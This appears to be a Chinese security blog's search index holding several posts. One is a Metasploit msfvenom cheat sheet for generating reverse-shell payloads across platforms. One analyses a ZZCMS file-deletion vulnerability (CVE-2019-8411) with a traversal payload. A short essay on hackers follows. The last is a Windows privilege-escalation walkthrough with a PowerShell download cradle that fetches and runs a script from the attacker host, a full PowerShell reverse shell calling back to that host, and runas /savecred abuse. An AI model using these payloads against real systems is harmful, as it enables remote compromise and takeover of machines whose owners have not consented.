<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Metasploit常用的Payload</title>
      <link href="/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/"/>
      <url>/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/</url>
      
        <content type="html"><![CDATA[<p>#####Metasploit最有用的能力之一就是msfpayload模块。使用msfpayload模块基本可以生成市场上各种系统、语言的payloads。</p><p>######列出有效payloads<br><code>msfvenom -l</code></p><p>######Linux<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p><p>######Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p><p>######Mac<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p><p>######Android<br><code>msfpayload android/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; android_backdoor.apk</code></p><p>######PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p><p>######ASP<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p><p>######JSP<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p><p>######WAR<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p><p>######Python<br><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p><p>######Bash<br><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p><p>######Perl<br><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p><p>######Linux Shellcode<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>######Windows Shellcode<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>######MAC Shellcode<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>连接Payloads:<br><code>use exploit/multi/handler</code><br><code>set payload linux/x86/meterpreter/bind_tcp</code><br><code>set RHOST 192.168.10.1</code><br><code>set LPORT 4444</code><br><code>exploit</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZZCMS任意删除漏洞“(CVE-2019-8411)</title>
      <link href="/2019/02/19/ZZCMS%E4%BB%BB%E6%84%8F%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E2%80%9C-CVE-2019-8411/"/>
      <url>/2019/02/19/ZZCMS%E4%BB%BB%E6%84%8F%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E2%80%9C-CVE-2019-8411/</url>
      
        <content type="html"><![CDATA[<h2 id="zzcms-任意删除文件漏洞-CVE-2019-8411-分析"><a href="#zzcms-任意删除文件漏洞-CVE-2019-8411-分析" class="headerlink" title="zzcms 任意删除文件漏洞(CVE-2019-8411) 分析"></a>zzcms 任意删除文件漏洞(CVE-2019-8411) 分析</h2><h3 id="Payload：action-del＆filename-1-php"><a href="#Payload：action-del＆filename-1-php" class="headerlink" title="Payload：action = del＆filename = .. / 1.php"></a>Payload：action = del＆filename = .. / 1.php</h3><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。"><a href="#这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。" class="headerlink" title="这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。"></a>这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。</h4><h5 id="打开admin-dl-data-php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。"><a href="#打开admin-dl-data-php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。" class="headerlink" title="打开admin/dl_data.php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。"></a>打开admin/dl_data.php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。</h5><p><img src="https://p3.ssl.qhimg.com/t01c727f1967ca7eba9.png" alt="![](https://p1.ssl.qhimg.com/t01bf0deb989f4d9684.png)"></p><h5 id="从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。"><a href="#从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。" class="headerlink" title="从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。"></a>从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。</h5><p><img src="https://p2.ssl.qhimg.com/t016f20f810d9885d7c.png" alt=""><br><img src="https://p3.ssl.qhimg.com/t01d7111a5d2d627cd6.png" alt=""></p><h5 id="进行简单的添加认证后，这个Payload-就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。"><a href="#进行简单的添加认证后，这个Payload-就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。" class="headerlink" title="进行简单的添加认证后，这个Payload 就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。"></a>进行简单的添加认证后，这个Payload 就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。</h5><p><img src="https://p4.ssl.qhimg.com/t0199eed13579d71097.png" alt=""><br><img src="https://p5.ssl.qhimg.com/t0176f7639cdf27d15b.png" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我们真的懂什么是黑客吗？</title>
      <link href="/2019/02/19/%E6%88%91%E4%BB%AC%E7%9C%9F%E7%9A%84%E6%87%82%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%91%E5%AE%A2%E5%90%97%EF%BC%9F/"/>
      <url>/2019/02/19/%E6%88%91%E4%BB%AC%E7%9C%9F%E7%9A%84%E6%87%82%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%91%E5%AE%A2%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="黑客是什么？"><a href="#黑客是什么？" class="headerlink" title="黑客是什么？ "></a><center>黑客是什么？ </center></h2><p>&emsp;&emsp; 黑客是什么？是映像中坐在电脑面前快速疯狂的敲几下键盘，就能黑了一台又一台的主机，甚至像出入自家院子一样随意的进入深网（有时“深网”这一术语被错误地用于指代暗网，其实不然前者指的是存在于黑暗网络、覆盖网络上的万维网内容，只能用特殊软件、特殊授权、或对计算机做特殊设置才能访问。暗网构成了深网的一小部分，深网网络没有被网络搜索引擎索引，后者指的是搜索引擎未索引（不能搜索到）的万维网内容）。<br><br>&emsp;&emsp;黑客</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows渗透之powershell提权</title>
      <link href="/2019/02/18/windows%E6%B8%97%E9%80%8F%E4%B9%8Bpowershell%E6%8F%90%E6%9D%83/"/>
      <url>/2019/02/18/windows%E6%B8%97%E9%80%8F%E4%B9%8Bpowershell%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p></p><h3>windows渗透之powershell提权</h3><p></p><p></p><h5>攻击机:10.10.14.158</h5><p></p><p></p><h5>服务器:10.10.10.98</h5><br>今天朋友给了个只有telnet权限的账号让我帮忙提权，我进去发现服务器禁止了.exe程序执行，只能执行部分系统指令，发现powershell可能唯一突破口，但同样对运行权限做了一定的限制。常用的Set-ExecutionPolicy Unrestricted限制熬过等指令都需要管理员权限。提权的关键在于Runas命令，其中runas带有 /savecred参数，能够以保存的用户凭据执行命令。<br>这时候我就想到通过ps1文件来远程服务器，方便以后上传下载文件。<br>一、使用msfvenom生成PS1文件：<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt;  -f psh-reflection &gt;shell.ps1</code><br>二、开启Msf监听：<br><code>msf &gt; use exploit/multi/handler</code><br><code>msf exploit(handler) &gt; set payload</code><br><code>windows/x64/meterpreter/reverse_tcp</code><br><code>payload =&gt; windows/meterpreter/reverse_tcp</code><br><code>msf exploit(handler) &gt; set lhost 10.10.14.158</code><br><code>lhost =&gt; 10.10.14.158</code><br><code>msf exploit(handler) &gt; set lport 4444</code><br><code>lport =&gt; 4444</code><br><code>msf &gt; run</code><br>三、在攻击机开启http服务器：<br><code>python -m SimpleHTTPServer 8000</code><br>四、在目标机器执行cmd命令：<br><code>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.158:8000/shell.ps1&#39;);xx.ps1&quot;</code><br>五、上传GetRoot.ps1脚本<br><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.158&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code><br>六、使用GetRoot.ps脚本提权。<br>脚本上传完成后，打开nc监听攻击机子的6666端口<br>然后在服务器上执行命令<code>runas /user:administrator /savecred &quot;powershell -ExecutionPolicy ByPass -File C:\Users\Public\new.ps1&quot;</code><br>这时候nc监听的窗口会自动转服务器的Adminsistrator账号。<p></p>]]></content>
      
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
